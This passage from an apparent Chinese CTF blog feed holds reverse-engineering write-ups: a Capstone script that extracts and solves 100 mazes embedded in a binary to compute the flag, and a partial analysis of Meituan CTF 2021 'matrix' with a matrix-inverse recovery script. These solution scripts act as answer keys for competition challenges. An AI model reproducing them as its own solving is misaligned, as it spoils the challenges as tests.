class="hljs-built_in">map</span>, startX, startY, direct, path</span>):</span><br>    <span class="hljs-built_in">map</span>[startY * <span class="hljs-number">25</span> + startX] = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;*&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(path) == <span class="hljs-number">15</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, path<br><br>    all_dir = []<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX, startY - <span class="hljs-number">1</span>):<br>        all_dir.append((startX, startY - <span class="hljs-number">1</span>, direct[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX, startY + <span class="hljs-number">1</span>):<br>        all_dir.append((startX, startY + <span class="hljs-number">1</span>, direct[<span class="hljs-number">2</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX - <span class="hljs-number">1</span>, startY):<br>        all_dir.append((startX - <span class="hljs-number">1</span>, startY, direct[<span class="hljs-number">3</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX + <span class="hljs-number">1</span>, startY):<br>        all_dir.append((startX + <span class="hljs-number">1</span>, startY, direct[<span class="hljs-number">4</span>]))<br><br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> all_dir:<br>        result = solve(<span class="hljs-built_in">map</span>, <span class="hljs-built_in">dir</span>[<span class="hljs-number">0</span>], <span class="hljs-built_in">dir</span>[<span class="hljs-number">1</span>], direct, path + <span class="hljs-built_in">dir</span>[<span class="hljs-number">2</span>])<br>        <span class="hljs-keyword">if</span> result[<span class="hljs-number">0</span>] == <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>例如对于第一轮</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">print(solve(map1, <span class="hljs-number">4</span>, <span class="hljs-number">24</span>, <span class="hljs-string">&#x27;kgMp9&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="完整自动化脚本"><a href="#完整自动化脚本" class="headerlink" title="完整自动化脚本"></a>完整自动化脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> Cs<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">offset</span>):</span><br>    data_bin = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;100mazes&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    data = data_bin[offset: offset + <span class="hljs-number">0x199b</span> + <span class="hljs-number">20</span>]<br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    inscnt = <span class="hljs-number">0</span><br>    inscnt2 = <span class="hljs-number">0</span><br>    map1 = []<br>    map2 = []<br>    map3 = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> md.disasm(data, offset):<br>        ins = <span class="hljs-string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;movbyte ptr [rbp&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            <span class="hljs-keyword">if</span> inscnt &lt; <span class="hljs-number">629</span>:<br>                <span class="hljs-comment">#print(ins)</span><br>                map1.append(<span class="hljs-built_in">int</span>(i.op_str.split(<span class="hljs-string">&#x27;, &#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>))<br>            inscnt += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;movdword ptr [rbp&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            <span class="hljs-keyword">if</span> inscnt2 &lt; <span class="hljs-number">2</span>:<br>                map3.append(<span class="hljs-built_in">int</span>(i.op_str.split(<span class="hljs-string">&#x27;, &#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>))<br>            inscnt2 += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;learax, [rip +&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            off1 = i.op_str[<span class="hljs-number">12</span>:-<span class="hljs-number">1</span>]<br>            off1 = <span class="hljs-built_in">int</span>(off1, <span class="hljs-number">16</span>) + i.address + <span class="hljs-number">7</span><br>            map2_data = data_bin[off1: off1 + <span class="hljs-number">4</span> * <span class="hljs-number">625</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">625</span>):<br>                map2.append(struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, map2_data[i * <span class="hljs-number">4</span>: i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br><br>    data = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">625</span>):<br>        data.append(map1[i] ^ map2[i])<br>    <span class="hljs-keyword">return</span> data, <span class="hljs-built_in">bytearray</span>(map1[-<span class="hljs-number">4</span>:]), map3<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkValid</span>(<span class="hljs-params"><span class="hljs-built_in">map</span>, x, y</span>):</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> y &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> x &gt; <span class="hljs-number">24</span> <span class="hljs-keyword">or</span> y &gt; <span class="hljs-number">24</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>[y * <span class="hljs-number">25</span> + x] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;.&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params"><span class="hljs-built_in">map</span>, startX, startY, direct, path</span>):</span><br>    <span class="hljs-built_in">map</span>[startY * <span class="hljs-number">25</span> + startX] = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;*&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(path) == <span class="hljs-number">15</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, path<br><br>    all_dir = []<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX, startY - <span class="hljs-number">1</span>):<br>        all_dir.append((startX, startY - <span class="hljs-number">1</span>, direct[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX, startY + <span class="hljs-number">1</span>):<br>        all_dir.append((startX, startY + <span class="hljs-number">1</span>, direct[<span class="hljs-number">2</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX - <span class="hljs-number">1</span>, startY):<br>        all_dir.append((startX - <span class="hljs-number">1</span>, startY, direct[<span class="hljs-number">3</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX + <span class="hljs-number">1</span>, startY):<br>        all_dir.append((startX + <span class="hljs-number">1</span>, startY, direct[<span class="hljs-number">4</span>]))<br><br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> all_dir:<br>        result = solve(<span class="hljs-built_in">map</span>, <span class="hljs-built_in">dir</span>[<span class="hljs-number">0</span>], <span class="hljs-built_in">dir</span>[<span class="hljs-number">1</span>], direct, path + <span class="hljs-built_in">dir</span>[<span class="hljs-number">2</span>])<br>        <span class="hljs-keyword">if</span> result[<span class="hljs-number">0</span>] == <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printMap</span>(<span class="hljs-params"><span class="hljs-built_in">map</span></span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>):<br>        line = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>):<br>            line += <span class="hljs-built_in">chr</span>(map1[i * <span class="hljs-number">25</span> + j])<br>        print(line)<br><br>funcs = <span class="hljs-string">&quot;&quot;&quot;maze_1(void).text000000000000078A00001AC500000C7800000000R....BT.</span><br><span class="hljs-string">maze_2(void).text000000000000224F00001A8F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_3(void).text0000000000003CDE00001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_4(void).text000000000000574F00001A2F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_5(void).text000000000000717E00001A5300000C7800000000R....BT.</span><br><span class="hljs-string">maze_6(void).text0000000000008BD100001A5900000C7800000000R....BT.</span><br><span class="hljs-string">maze_7(void).text000000000000A62A00001A2F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_8(void).text000000000000C05900001B2500000C7800000000R....BT.</span><br><span class="hljs-string">maze_9(void).text000000000000DB7E00001A2300000C7800000000R....BT.</span><br><span class="hljs-string">maze_10(void).text000000000000F5A100001A8300000C7800000000R....BT.</span><br><span class="hljs-string">maze_11(void).text0000000000011024000019B100000C7800000000R....BT.</span><br><span class="hljs-string">maze_12(void).text00000000000129D500001A4700000C7800000000R....BT.</span><br><span class="hljs-string">maze_13(void).text000000000001441C00001A8300000C7800000000R....BT.</span><br><span class="hljs-string">maze_14(void).text0000000000015E9F00001A6B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_15(void).text000000000001790A00001A7D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_16(void).text000000000001938700001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_17(void).text000000000001AE5E00001A9B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_18(void).text000000000001C8F900001AB300000C7800000000R....BT.</span><br><span class="hljs-string">maze_19(void).text000000000001E3AC00001AAD00000C7800000000R....BT.</span><br><span class="hljs-string">maze_20(void).text000000000001FE5900001B2B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_21(void).text000000000002198400001A9B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_22(void).text000000000002341F00001A9B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_23(void).text0000000000024EBA00001ADD00000C7800000000R....BT.</span><br><span class="hljs-string">maze_24(void).text000000000002699700001A5900000C7800000000R....BT.</span><br><span class="hljs-string">maze_25(void).text00000000000283F000001A3500000C7800000000R....BT.</span><br><span class="hljs-string">maze_26(void).text0000000000029E2500001A8300000C7800000000R....BT.</span><br><span class="hljs-string">maze_27(void).text000000000002B8A800001A4700000C7800000000R....BT.</span><br><span class="hljs-string">maze_28(void).text000000000002D2EF00001AB900000C7800000000R....BT.</span><br><span class="hljs-string">maze_29(void).text000000000002EDA800001AB300000C7800000000R....BT.</span><br><span class="hljs-string">maze_30(void).text000000000003085B00001AA100000C7800000000R....BT.</span><br><span class="hljs-string">maze_31(void).text00000000000322FC00001A8900000C7800000000R....BT.</span><br><span class="hljs-string">maze_32(void).text0000000000033D8500001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_33(void).text000000000003581A00001A7D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_34(void).text000000000003729700001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_35(void).text0000000000038D2C00001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_36(void).text000000000003A79D00001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_37(void).text000000000003C23200001A7D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_38(void).text000000000003DCAF00001A8F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_39(void).text000000000003F73E00001A7700000C7800000000R....BT.</span><br><span class="hljs-string">maze_40(void).text00000000000411B500001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_41(void).text0000000000042C4A00001AA100000C7800000000R....BT.</span><br><span class="hljs-string">maze_42(void).text00000000000446EB00001A5300000C7800000000R....BT.</span><br><span class="hljs-string">maze_43(void).text000000000004613E00001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_44(void).text0000000000047BD300001A6B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_45(void).text000000000004963E00001B4F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_46(void).text000000000004B18D00001A5300000C7800000000R....BT.</span><br><span class="hljs-string">maze_47(void).text000000000004CBE000001A6500000C7800000000R....BT.</span><br><span class="hljs-string">maze_48(void).text000000000004E64500001A8300000C7800000000R....BT.</span><br><span class="hljs-string">maze_49(void).text00000000000500C800001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_50(void).text0000000000051B5D00001B0D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_51(void).text000000000005366A00001A6B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_52(void).text00000000000550D500001ABF00000C7800000000R....BT.</span><br><span class="hljs-string">maze_53(void).text0000000000056B9400001AE900000C7800000000R....BT.</span><br><span class="hljs-string">maze_54(void).text000000000005867D00001A3B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_55(void).text000000000005A0B800001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_56(void).text000000000005BB4D00001A5900000C7800000000R....BT.</span><br><span class="hljs-string">maze_57(void).text000000000005D5A600001AD100000C7800000000R....BT.</span><br><span class="hljs-string">maze_58(void).text000000000005F07700001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_59(void).text0000000000060AE800001A3500000C7800000000R....BT.</span><br><span class="hljs-string">maze_60(void).text000000000006251D00001A5900000C7800000000R....BT.</span><br><span class="hljs-string">maze_61(void).text0000000000063F7600001A4D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_62(void).text00000000000659C300001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_63(void).text000000000006749A00001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_64(void).text0000000000068F7100001AA100000C7800000000R....BT.</span><br><span class="hljs-string">maze_65(void).text000000000006AA1200001AD100000C7800000000R....BT.</span><br><span class="hljs-string">maze_66(void).text000000000006C4E300001B2500000C7800000000R....BT.</span><br><span class="hljs-string">maze_67(void).text000000000006E00800001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_68(void).text000000000006FA9D00001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_69(void).text000000000007150E00001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_70(void).text0000000000072FE500001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_71(void).text0000000000074A5600001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_72(void).text000000000007652D00001AF500000C7800000000R....BT.</span><br><span class="hljs-string">maze_73(void).text000000000007802200001AFB00000C7800000000R....BT.</span><br><span class="hljs-string">maze_74(void).text0000000000079B1D00001AB900000C7800000000R....BT.</span><br><span class="hljs-string">maze_75(void).text000000000007B5D600001AB900000C7800000000R....BT.</span><br><span class="hljs-string">maze_76(void).text000000000007D08F00001AF500000C7800000000R....BT.</span><br><span class="hljs-string">maze_77(void).text000000000007EB8400001A4700000C7800000000R....BT.</span><br><span class="hljs-string">maze_78(void).text00000000000805CB000019FF00000C7800000000R....BT.</span><br><span class="hljs-string">maze_79(void).text0000000000081FCA00001AF500000C7800000000R....BT.</span><br><span class="hljs-string">maze_80(void).text0000000000083ABF00001ACB00000C7800000000R....BT.</span><br><span class="hljs-string">maze_81(void).text000000000008558A00001A8F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_82(void).text000000000008701900001AAD00000C7800000000R....BT.</span><br><span class="hljs-string">maze_83(void).text0000000000088AC600001ABF00000C7800000000R....BT.</span><br><span class="hljs-string">maze_84(void).text000000000008A58500001A3B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_85(void).text000000000008BFC000001A7700000C7800000000R....BT.</span><br><span class="hljs-string">maze_86(void).text000000000008DA3700001AD100000C7800000000R....BT.</span><br><span class="hljs-string">maze_87(void).text000000000008F50800001ACB00000C7800000000R....BT.</span><br><span class="hljs-string">maze_88(void).text0000000000090FD300001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_89(void).text0000000000092A6800001B0D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_90(void).text000000000009457500001ABF00000C7800000000R....BT.</span><br><span class="hljs-string">maze_91(void).text000000000009603400001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_92(void).text0000000000097AA500001ACB00000C7800000000R....BT.</span><br><span class="hljs-string">maze_93(void).text000000000009957000001A1100000C7800000000R....BT.</span><br><span class="hljs-string">maze_94(void).text000000000009AF8100001A9B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_95(void).text000000000009CA1C00001B0700000C7800000000R....BT.</span><br><span class="hljs-string">maze_96(void).text000000000009E52300001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_97(void).text000000000009FFB800001AAD00000C7800000000R....BT.</span><br><span class="hljs-string">maze_98(void).text00000000000A1A6500001AF500000C7800000000R....BT.</span><br><span class="hljs-string">maze_99(void).text00000000000A355A00001B1F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_100(void).text00000000000A507900001A2F00000C7800000000R....BT.&quot;&quot;&quot;</span><br><br>total = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> ll <span class="hljs-keyword">in</span> funcs.splitlines():<br>    ll = ll.split(<span class="hljs-string">&quot;&quot;</span>)<br>    addr = <span class="hljs-built_in">int</span>(ll[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>    map1, dirs, target = decode(addr)<br>    print(<span class="hljs-string">&quot;process:&quot;</span> + <span class="hljs-built_in">hex</span>(addr))<br>    rr = solve(map1, target[<span class="hljs-number">0</span>], target[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;A&#x27;</span> + dirs.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>)<br>    total += rr[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">import</span> hashlib<br>mm = hashlib.md5(total.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br>print(total)<br>print(<span class="hljs-built_in">len</span>(total))<br>d = mm<br>print(<span class="hljs-string">&quot;flag&#123;%s-%s-%s-%s-%s&#125;&quot;</span> % (d[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>],d[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>],d[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>],d[<span class="hljs-number">16</span>:<span class="hljs-number">20</span>],d[<span class="hljs-number">20</span>:<span class="hljs-number">32</span>]))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Capstone</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>美团CTF: matrix</title>
    <link href="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-matrix/"/>
    <url>/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-matrix/</url>
    
    <content type="html"><![CDATA[<h1 id="美团-CTF-2021-matrix"><a href="#美团-CTF-2021-matrix" class="headerlink" title="美团 CTF 2021 matrix"></a>美团 CTF 2021 matrix</h1><p>题目下载: <a href="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-matrix/matrix.exe" title="matrix.exe">matrix.exe</a></p><p>整体上来说就是 AES 一轮运算部分函数的魔改</p><p>输入数据转换成 4 x 4 矩阵，记做 Input</p><h2 id="main-函数有-3-处异常"><a href="#main-函数有-3-处异常" class="headerlink" title="main 函数有 3 处异常"></a>main 函数有 3 处异常</h2><p>异常依次发生:</p><ul><li>EXCEPTION_BREAKPOINT</li><li>EXCEPTION_ILLEGAL_INSTRUCTION</li><li>EXCEPTION_ACCESS_VIOLATION</li></ul><p>每次异常处理都会对输入的数据进行变换,</p><ol start="0"><li><p><code>行混淆</code> </p><p>每次异常处理对应的一个特定的变换，外加一个 AES 行混淆</p></li></ol><ol><li><p>EXCEPTION_BREAKPOINT 异常, 对输入矩阵进行 <code>密钥加</code> 运算</p><p>​        对输入矩阵的每个元素异或 <code>0x6E</code><br>​        对输入矩阵再进行<code>行混淆</code></p></li></ol><ol start="2"><li>EXCEPTION_ILLEGAL_INSTRUCTION</li></ol><p>对输入矩阵进行<code>矩阵乘法</code>运算，模 251</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">M</span> =                               <span class="hljs-number">0</span>xe, <span class="hljs-number">0</span>xb, <span class="hljs-number">0</span>xd, <span class="hljs-number">0</span>x<span class="hljs-number">9</span>,<br>                                  <span class="hljs-attribute">0x9</span>, <span class="hljs-number">0</span>xe, <span class="hljs-number">0</span>xb, <span class="hljs-number">0</span>xd,<br>                                  <span class="hljs-attribute">0xd</span>, <span class="hljs-number">0</span>x<span class="hljs-number">9</span>, <span class="hljs-number">0</span>xe, <span class="hljs-number">0</span>xb,<br>                                  <span class="hljs-attribute">0xb</span>, <span class="hljs-number">0</span>xd, <span class="hljs-number">0</span>x<span class="hljs-number">9</span>, <span class="hljs-number">0</span>xe <br></code></pre></td></tr></table></figure><p>Input * M % 251</p><p>最后进行<code>行混淆</code></p><p>求逆脚本, tt 是输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fun</span>(<span class="hljs-params">t</span>):</span><br>    ans=[[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        t = [tt[_][i] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>        TT = matrix(Zmod(<span class="hljs-number">251</span>), t).T<br><br>        ansi = inv_mt*TT<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            ans[j][i] = ansi[j][<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> ans<br><br>mt = [<br>        [<span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>,  <span class="hljs-number">9</span>],<br>        [ <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>],<br>        [<span class="hljs-number">13</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">11</span>],<br>        [<span class="hljs-number">11</span>, <span class="hljs-number">13</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>]<br>        ]<br><br>MT = Matrix(Zmod(<span class="hljs-number">251</span>), mt)<br>inv_mt = MT.inverse()<br><br>tt = [[<span class="hljs-number">0x7e</span>,<span class="hljs-number">0xd4</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x2d</span>],<br>[<span class="hljs-number">0x26</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x9a</span>],<br>[<span class="hljs-number">0x4c</span>,<span class="hljs-number">0xa1</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x7c</span>],<br>[<span class="hljs-number">0xe5</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xfe</span>]]<br><br>ans = 